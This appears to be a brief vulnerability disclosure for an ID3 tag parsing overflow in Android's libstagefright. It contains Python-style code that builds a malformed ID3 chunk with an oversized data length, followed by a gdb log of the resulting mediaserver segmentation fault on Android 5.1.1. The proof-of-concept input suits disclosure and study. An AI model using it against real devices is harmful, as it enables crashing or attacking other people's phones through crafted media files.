Android libstagefright ID3 tag parsing overflow.

File 1.mp4 has corrupted ID32 chunk:

s='ID3'
s+=chr(4)
s+=chr(0)
s+=chr(0) # flags
s+='\x00\x00\x20\x00' #4096
s+='abcd'
s+=struct.pack('>L',0xfffffffe) # datalen
s+=struct.pack('>h',2)
s+='a'*5000


Mediaserver crash on Android 5.1.1 x86:
(gdb)
Program received signal SIGSEGV, Segmentation fault.
0xb69929c0 in android::ID3::removeUnsynchronizationV2_4(bool) ()
   from /dist/android/lib/libstagefright.so
(gdb) x/1i $pc
=> 0xb69929c0 <_ZN7android3ID327removeUnsynchronizationV2_4Eb+272>:	movzbl (%edx,%eax,1),%eax
(gdb) i r edx eax
edx            0xb592f000	-1248661504
eax            0x6d1000	7147520
(gdb) 

